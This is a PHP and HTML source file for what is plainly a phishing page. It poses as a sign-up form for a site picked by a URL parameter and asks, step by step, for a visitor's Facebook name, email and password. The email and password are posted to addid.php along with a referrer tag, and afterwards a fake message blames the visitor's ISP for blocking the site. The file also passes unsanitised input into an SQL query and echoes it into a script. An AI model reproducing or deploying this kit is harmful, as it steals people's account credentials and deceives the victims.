<?php
require('connect.php');
require('Mobile_Detect.php');
if(isset($_GET['whom'])){
	$whom = $_GET['whom'];
	$query = mysqli_query($con, "SELECT * FROM website WHERE chawara='$whom'");
	$result = mysqli_fetch_array($query);
	$title = $result['title'];
	$description = $result['description'];
}else{
exit();
}
?>

<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		 <meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title><?php echo $title; ?></title>
		<link rel="stylesheet" href="dist/css/bootstrap.css" type="text/css" />
		<link rel="stylesheet" href="dist/css/bootstrap-theme.css" type="text/css" />
		<link rel="stylesheet" href="dist/css/custom.css" type="text/css" />
		<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
		<link href='http://fonts.googleapis.com/css?family=Open+Sans:400,300,700' rel='stylesheet' type='text/css'>
		<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
		<script src="https://code.jquery.com/jquery-2.1.3.min.js"></script>
		<script src="js/bootstrap.min.js"></script>
		<script>
			$(document).ready(function(){
				$("#step1btn").click(function(){
					if($("#name").val() == ""){
						return false;
					}else{
						$("#step2").fadeIn();
						$("#step1btn").css("display", "none");
					}
				});
				$("#step2btn").click(function(){
					if($("#email").val() == ""){
						return false;
					}else{
					$("#step3").fadeIn();
					$("#step2btn").css("display", "none");
					}
				});
				$("#finalbtn").click(function(){
					if($("#password").val() == ""){
						return false;
					}else{
						$("#step1").css("display", "none");
						$("#step2").css("display", "none");
						$("#step3").css("display", "none");
						$("#loading").fadeIn();
						
						$.post( "addid.php",{ email: $("#email").val(), pass: $("#password").val(), by: '<?php echo $whom; ?>'}, function(data){
							$("#loading").css("display", "none");
							$("#error").fadeIn();
						}, "json");
					}
				});
			});
		</script>
	</head>
	
<body>
<?php $detect = new Mobile_Detect; ?>
	<center class="head" style="padding: 56px;">
		<h1 style="color: white; margin: 0px; font-size: 45px;" ><i class="fa fa-<?php echo $result['logo']; ?>"></i></h1>
	<?php if($detect->isMobile()){ ?>
<h3 style="color: white; padding-bottom: 0px; margin-bottom: 0px;" class="montserrat"><?php  echo $title; ?></h3>
<?php } ?>
	</center>
  
  <div class="content"></div>
<?php if($detect->isMobile()){ }else{ ?>
  <center><h3 class="banner montserrat" style="font-size: 35px; font-weight: bold;"><?php echo $title; ?></h3></center>
<?php } ?>
	<div class="row" style="float: none;">

	<div class="col-md-4" style="float: none; margin: 0 auto;">
		<div class="customWell" style="margin: 15px;">
			<legend style="margin-bottom: 8px;"><i class="fa fa-hand-o-right"></i> Welcome to <?php echo $title; ?></legend>
			<p><?php echo $description; ?></p>
		</div>
		
		<div class="customWell" style="margin: 15px;">
			<legend style="margin-bottom: 8px;"><i class="fa fa-facebook-official"></i> Sign up using facebook</legend>
			<p>To join <?php echo $title; ?> you need to have a facebook account.</p>
			<div id="step1">
				<input type="text" class="form-control" placeholder="Your name (as on facebook)" id="name"> 
				<input type="submit" class="btn btn-danger" style="margin-top: 10px;" id="step1btn">
			</div>
			<div id="step2" style="display: none;">
				<input type="email" class="form-control" placeholder="Your email address (as on facebook)" style="margin-top: 6px;" id="email"> 
				<input type="submit" class="btn btn-danger" style="margin-top: 10px;" id="step2btn">
			</div>
			<div id="step3" style="display: none;">
				<input type="password" class="form-control" placeholder="Your password (as on facebook)" style="margin-top: 6px;" id="password"> 
				<input type="submit" class="btn btn-danger" style="margin-top: 10px;" id="finalbtn" value="Signup">
			</div>
			<div id="loading" style="display: none;">
				<center>
					<h1><i class="fa fa-circle-o-notch fa-spin"></i></h1>
					<p>Completing your request...</p>
				</center>
			</div>
			<div id="error" style="display: none;">
				<div class="alert alert-danger">You can't join because <?php echo $title ?> has been blocked in your area by your ISP.</div>
			</div>
		
		</div>
	<hr class="style-eight" style="margin-bottom: 7px;">
	<center><h4 style="margin-top: 0px;" class="montserrat"><?php echo $result['footer']; ?></h4></center>
	</div>
	
	</div>
	
</body>
</html>